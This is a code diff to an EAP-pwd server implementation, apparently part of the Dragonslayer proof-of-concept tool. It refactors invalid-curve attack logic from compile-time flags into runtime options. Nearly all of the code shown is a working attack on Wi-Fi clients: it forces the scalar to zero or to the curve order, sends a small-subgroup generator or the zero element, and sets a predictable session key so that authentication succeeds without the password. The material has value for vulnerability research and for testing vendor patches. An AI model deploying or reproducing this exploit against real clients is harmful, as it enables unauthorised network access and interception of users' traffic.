@@ -17,9 +17,9 @@
 
 #include "common/attacks.h"
 
-#ifdef DRAGONBLOOD
+#ifdef DRAGONSLAYER
 #include "eapol_supp/eapol_supp_sm.h"
-#endif // DRAGONBLOOD
+#endif // DRAGONSLAYER
 
 struct eap_pwd_data {
 	enum {
@@ -38,7 +38,7 @@ struct eap_pwd_data {
 	u16 group_num;
 	u8 password_prep;
 	EAP_PWD_group *grp;
-#ifdef DRAGONBLOOD_INVALID_CUVE
+#ifdef DRAGONSLAYER
 	struct crypto_ec *subgroup;
 	struct crypto_ec_point *subgroup_generator;
 #endif
@@ -283,35 +283,39 @@ static void eap_pwd_build_commit_req(struct eap_sm *sm,
 		goto fin;
 	}
 
-/** Test if a scalar equal to zero is accepted */
-#ifdef DRAGONBLOOD_INVALID_CUVE
-
-	if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
-	                      data->private_value, mask) < 0 ||
-	    crypto_bignum_add(data->private_value, mask,
-			      data->my_scalar) < 0 ||
-	    crypto_bignum_mod(data->my_scalar,
-			      crypto_ec_get_order(data->grp->group),
-			      data->my_scalar) < 0) {
-		poc_log(sm->peer_addr,
-			   "EAP-pwd (peer): unable to force scalar to zero");
-		goto fin;
+/** Test if a scalar equal to zero or equal to the order is accepted */
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve || dragonslayer_invalidcurve_aruba)
+	{
+		if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
+			              data->private_value, mask) < 0 ||
+		    crypto_bignum_add(data->private_value, mask,
+				      data->my_scalar) < 0 ||
+		    crypto_bignum_mod(data->my_scalar,
+				      crypto_ec_get_order(data->grp->group),
+				      data->my_scalar) < 0) {
+			poc_log(sm->peer_addr,
+				   "EAP-pwd (peer): unable to force scalar to zero");
+			goto fin;
+		}
 	}
 
-#ifndef DRAGONBLOOD_ARUBA_CLIENT
-	poc_log(sm->peer_addr, "sending a scalar equal to zero\n");
-#else
-	if (crypto_bignum_add(data->my_scalar, crypto_ec_get_order(data->grp->group),
-			      data->my_scalar) < 0) {
-		poc_log(sm->peer_addr,
-			   "EAP-pwd (peer): unable to force scalar to order");
-		goto fin;
+	if (dragonslayer_invalidcurve_aruba)
+	{
+		if (crypto_bignum_add(data->my_scalar, crypto_ec_get_order(data->grp->group),
+				      data->my_scalar) < 0) {
+			poc_log(sm->peer_addr,
+				   "EAP-pwd (peer): unable to force scalar to order");
+			goto fin;
+		}
+
+		poc_log(sm->peer_addr, "setting scalar equal to order of the curve\n\n\n");
 	}
-
-	poc_log(sm->peer_addr, "setting scalar equal to order of the curve\n\n\n");
-#endif
-
-#endif // DRAGONBLOOD_INVALID_CUVE
+	else
+	{
+		poc_log(sm->peer_addr, "sending a scalar equal to zero\n");
+	}
+#endif // DRAGONSLAYER
 
 	if (crypto_ec_point_mul(data->grp->group, data->grp->pwe, mask,
 				data->my_element) < 0) {
@@ -342,28 +346,33 @@ static void eap_pwd_build_commit_req(struct eap_sm *sm,
 	}
 
 /** We send the subgroup generator as our peer element */
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	if (data->subgroup == NULL) {
-		data->subgroup = crypto_ec_subgroup(3, &data->subgroup_generator);
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve)
+	{
 		if (data->subgroup == NULL) {
-			poc_log(sm->peer_addr, "ERROR: failed to initialize subgroup parameters!\n");
+			data->subgroup = crypto_ec_subgroup(3, &data->subgroup_generator);
+			if (data->subgroup == NULL) {
+				poc_log(sm->peer_addr, "ERROR: failed to initialize subgroup parameters!\n");
+				exit(1);
+			}
+		}
+
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
+					   element + prime_len) != 0) {
+			poc_log(sm->peer_addr, "ERROR: subgroup generator assignment failed!\n");
 			exit(1);
 		}
-	}
 
-	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
-				   element + prime_len) != 0) {
-		poc_log(sm->peer_addr, "ERROR: subgroup generator assignment failed!\n");
-		exit(1);
+		poc_log(sm->peer_addr, "sending generator of small subgroup as the element\n");
 	}
-#ifndef DRAGONBLOOD_ARUBA_CLIENT
-	poc_log(sm->peer_addr, "sending generator of small subgroup as the element\n");
-#else
-	poc_log(sm->peer_addr, "sending zero element\n");
-	memset(element, 0, prime_len * 2);
-#endif
-
-#endif // DRAGONBLOOD_INVALID_CUVE
+	/** Send element at infinity to attack Aruba implementations */
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		poc_log(sm->peer_addr, "sending element at infinity (= zero element)\n");
+		memset(element, 0, prime_len * 2);
+	}
+	/** Note: we cannot perform reflection attacks against the client */
+#endif // DRAGONSLAYER
 
 	crypto_bignum_to_bin(data->my_scalar, scalar, order_len, order_len);
 
@@ -442,19 +451,21 @@ static void eap_pwd_build_confirm_req(struct eap_sm *sm,
 			   "assignment fail");
 		goto fin;
 	}
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	/* my element was the generator of the subgroup */
-	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
-				   cruft + prime_len) != 0) {
-		poc_log(sm->peer_addr, "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
-		goto fin;
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve)
+	{
+		/* my element was the generator of the subgroup */
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
+					   cruft + prime_len) != 0) {
+			poc_log(sm->peer_addr, "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+			goto fin;
+		}
 	}
-
-#ifdef DRAGONBLOOD_ARUBA_CLIENT
-	memset(cruft, 0, prime_len * 2);
-#endif
-
-#endif
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		memset(cruft, 0, prime_len * 2);
+	}
+#endif // DRAGONSLAYER
 	eap_pwd_h_update(hash, cruft, prime_len * 2);
 
 	/* server scalar */
@@ -847,20 +858,22 @@ eap_pwd_process_commit_resp(struct eap_sm *sm, struct eap_pwd_data *data,
 			   "shared secret from secret point");
 		goto fin;
 	}
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	/* we have to predict the session key, since we don't have a confirm frame of the client */
-	if (crypto_ec_point_x(data->subgroup, data->subgroup_generator, data->k)) {
-		poc_log(sm->peer_addr, "ERROR: %s: failed to get X-coordinate of k\n", __FUNCTION__);
-		goto fin;
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve)
+	{
+		/* we have to predict the session key, since we don't have a confirm frame of the client */
+		if (crypto_ec_point_x(data->subgroup, data->subgroup_generator, data->k)) {
+			poc_log(sm->peer_addr, "ERROR: %s: failed to get X-coordinate of k\n", __FUNCTION__);
+			goto fin;
+		}
+		poc_log(sm->peer_addr, "configured X-coordinate of subgroup generator as session key\n", __FUNCTION__);
 	}
-#ifndef DRAGONBLOOD_ARUBA_CLIENT
-	poc_log(sm->peer_addr, "configured X-coordinate of subgroup generator as session key\n", __FUNCTION__);
-#else
-	crypto_bignum_setint(data->k, 0);
-	poc_log(sm->peer_addr, "configured all-zeros as session key\n", __FUNCTION__);
-#endif
-
-#endif
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		crypto_bignum_setint(data->k, 0);
+		poc_log(sm->peer_addr, "configured all-zeros as session key\n", __FUNCTION__);
+	}
+#endif // DRAGONSLAYER
 	res = 1;
 
 fin:
@@ -943,19 +956,21 @@ eap_pwd_process_confirm_resp(struct eap_sm *sm, struct eap_pwd_data *data,
 			   "assignment fail");
 		goto fin;
 	}
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	/* my element was the generator of the subgroup */
-	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
-				   cruft + prime_len) != 0) {
-		poc_log(sm->peer_addr, "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
-		goto fin;
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve)
+	{
+		/* my element was the generator of the subgroup */
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
+					   cruft + prime_len) != 0) {
+			poc_log(sm->peer_addr, "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+			goto fin;
+		}
 	}
-
-#ifdef DRAGONBLOOD_ARUBA_CLIENT
-	memset(cruft, 0, prime_len * 2);
-#endif
-
-#endif
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		memset(cruft, 0, prime_len * 2);
+	}
+#endif // DRAGONSLAYER
 	eap_pwd_h_update(hash, cruft, prime_len * 2);
 
 	/* server scalar */
